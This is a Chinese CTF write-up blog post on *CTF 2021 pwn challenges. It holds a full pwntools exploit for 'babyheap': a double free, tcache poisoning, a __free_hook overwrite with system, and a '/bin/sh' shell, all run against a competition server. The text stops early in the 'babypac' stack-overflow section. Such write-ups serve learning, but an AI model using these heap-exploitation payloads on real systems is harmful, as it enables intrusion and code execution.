<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>*CTF 2021 - Stay Hungry</title><meta name="Description" content="This is My New Hugo Site"><meta property="og:title" content="*CTF 2021" />
<meta property="og:description" content="赛前科恩那边说二进制的题应该没什么难度，我知道我很弱了不要再说了&hellip;放假比较闲那就慢慢复现学习一下吧

babyheap：tcache_struct, double free, 新libc
babypac：ARMv8.3, pac, ROP
fav arch1：RISC-V64 ROP
fav arch2：qemu sandbox bypass, RISC-V ROP
babygame： C&#43;&#43;析构函数, double free
babyxv6：RISC-V, kernel, 自定义漏洞syscall
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://xidoo.top/2021/01/starctf2021/" /><meta property="og:image" content="http://xidoo.top/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-01-23T21:11:44+08:00" />
<meta property="article:modified_time" content="2021-01-23T21:11:44+08:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://xidoo.top/logo.png"/>

<meta name="twitter:title" content="*CTF 2021"/>
<meta name="twitter:description" content="赛前科恩那边说二进制的题应该没什么难度，我知道我很弱了不要再说了&hellip;放假比较闲那就慢慢复现学习一下吧

babyheap：tcache_struct, double free, 新libc
babypac：ARMv8.3, pac, ROP
fav arch1：RISC-V64 ROP
fav arch2：qemu sandbox bypass, RISC-V ROP
babygame： C&#43;&#43;析构函数, double free
babyxv6：RISC-V, kernel, 自定义漏洞syscall
"/>
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://xidoo.top/2021/01/starctf2021/" /><link rel="prev" href="http://xidoo.top/2021/01/riscv-pwn/" /><link rel="next" href="http://xidoo.top/2021/01/armpwn/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "*CTF 2021",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/xidoo.top\/2021\/01\/starctf2021\/"
        },"genre": "posts","wordcount":  6286 ,
        "url": "http:\/\/xidoo.top\/2021\/01\/starctf2021\/","datePublished": "2021-01-23T21:11:44+08:00","dateModified": "2021-01-23T21:11:44+08:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "x1do0"
            },"description": ""
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Stay Hungry">🚩 Stay hungry</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/friends/"> Friends </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Stay Hungry">🚩 Stay hungry</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/friends/" title="">Friends</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">*CTF 2021</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>x1do0</a></span>&nbsp;<span class="post-category">included in <a href="/categories/pwn/"><i class="far fa-folder fa-fw"></i>PWN</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-23">2021-01-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;6286 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;30 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#babyheap">babyheap</a></li>
    <li><a href="#babypac">babypac</a></li>
    <li><a href="#favourite-architecture-1">favourite architecture 1</a></li>
    <li><a href="#favourite-arch-2">favourite arch 2</a></li>
    <li><a href="#babygame">babygame</a></li>
    <li><a href="#babyxv6">babyxv6</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>赛前科恩那边说二进制的题应该没什么难度，我知道我很弱了不要再说了&hellip;放假比较闲那就慢慢复现学习一下吧</p>
<ul>
<li>babyheap：tcache_struct, double free, 新libc</li>
<li>babypac：ARMv8.3, pac, ROP</li>
<li>fav arch1：RISC-V64 ROP</li>
<li>fav arch2：qemu sandbox bypass, RISC-V ROP</li>
<li>babygame： C++析构函数, double free</li>
<li>babyxv6：RISC-V, kernel, 自定义漏洞syscall</li>
</ul>
<h2 id="babyheap">babyheap</h2>
<p>用的新libc2.27，添加了类似于2.29的tcache检测，最新的diff如下。提前已经知道了所以这题出的很快，可惜没抢到血。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.loli.net/2021/01/23/xVwiAZBdIGS6Kco.png"
        data-srcset="https://i.loli.net/2021/01/23/xVwiAZBdIGS6Kco.png, https://i.loli.net/2021/01/23/xVwiAZBdIGS6Kco.png 1.5x, https://i.loli.net/2021/01/23/xVwiAZBdIGS6Kco.png 2x"
        data-sizes="auto"
        alt="https://i.loli.net/2021/01/23/xVwiAZBdIGS6Kco.png"
        title="https://i.loli.net/2021/01/23/xVwiAZBdIGS6Kco.png" /></p>
<p>由于edit改不了前面的8个字节，所以double free只能先打到堆上tcache结构体，使任意分配的同时将0x410的tcache的count填满，让输入name的chunk能直接进入unsorted bin去泄露libc地址，最后tcache poisoning去打free_hook（one_gadget没打通所以没打malloc_hook）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1">#coding:utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># import pwn_framework as pf</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">global</span> <span class="n">io</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span> <span class="n">x</span>        <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span> <span class="n">x</span>        <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span>           <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span> <span class="n">x</span>        <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rv</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span> <span class="n">x</span><span class="o">=</span><span class="mi">1024</span>   <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">numb</span> <span class="o">=</span> <span class="n">x</span><span class="p">)</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span>     <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span>    <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="n">rr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span> <span class="n">t</span>        <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
<span class="n">rd</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span> <span class="n">x</span>        <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="c1"># amd64 or x86</span>
<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>

<span class="n">filename</span> <span class="o">=</span> <span class="s2">&#34;./pwn&#34;</span>
<span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;52.152.231.198&#34;</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">8081</span>

<span class="n">LOCAL</span> <span class="o">=</span> <span class="kc">False</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span> <span class="k">else</span> <span class="kc">False</span>

<span class="k">global</span> <span class="n">bps</span> <span class="c1"># Break Points</span>
<span class="k">global</span> <span class="n">gds</span> <span class="c1"># Gdb Debug Symbols</span>
<span class="n">bps</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">gds</span> <span class="o">=</span> <span class="p">{}</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>

<span class="n">remote_libc</span> <span class="o">=</span> <span class="s2">&#34;./libc.so.6&#34;</span>
<span class="k">if</span> <span class="n">LOCAL</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">aslr</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">remote_libc</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">remote_libc</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">XXX</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    
<span class="k">def</span> <span class="nf">lg</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">name</span><span class="o">+</span><span class="s2">&#34; : &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;input index</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;input size</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">con</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;input index</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;input content</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">con</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;input index</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;input index</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">input_name</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;your name:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show_name</span><span class="p">():</span>
    <span class="n">sla</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;6&#39;</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>

<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>

<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">heap_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">lg</span><span class="p">(</span><span class="s2">&#34;heap_addr&#34;</span><span class="p">,</span> <span class="n">heap_addr</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">input_name</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_addr</span> <span class="o">-</span> <span class="mh">0x260</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">))</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0707070707070707</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x3ebca0</span>
<span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_addr&#34;</span><span class="p">,</span> <span class="n">libc_addr</span><span class="p">)</span>
<span class="c1"># raw_input()</span>
<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
<span class="n">lg</span><span class="p">(</span><span class="s2">&#34;malloc_hook&#34;</span><span class="p">,</span> <span class="n">malloc_hook</span><span class="p">)</span>

<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
<span class="n">lg</span><span class="p">(</span><span class="s2">&#34;free_hook&#34;</span><span class="p">,</span> <span class="n">free_hook</span><span class="p">)</span>
<span class="n">sys_addr</span><span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0707070707070707</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>

<span class="n">one</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x10a41c</span><span class="p">,</span> <span class="mh">0x4f432</span><span class="p">,</span> <span class="mh">0x4f3d5</span><span class="p">]</span>

<span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">))</span>

<span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0707070707070707</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="babypac">babypac</h2>
<p>arm64架构，装好qemu-user后直接运行cmd就能跑</p>
<p>auth与lock函数都可以负溢出，于是可以充分利用最先输入的name让其成功auth，进入到后门函数sub_400BDC，为qemu-user的arm64栈溢出。题目中pac的意思为Pointer authentication，是ARMv8.3-A对抗ROP攻击的一项技术，攻破该技术便是出题者的意图。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">ssize_t</span> <span class="nf">sub_400BDC</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [xsp+0h] [xbp-20h] BYREF
</span><span class="c1"></span>
  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>                <span class="c1">// stack_overflow
</span><span class="c1"></span><span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>如果没有注意到负溢出，直接硬刚sub_4009D8也行，但是注意PACIA命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
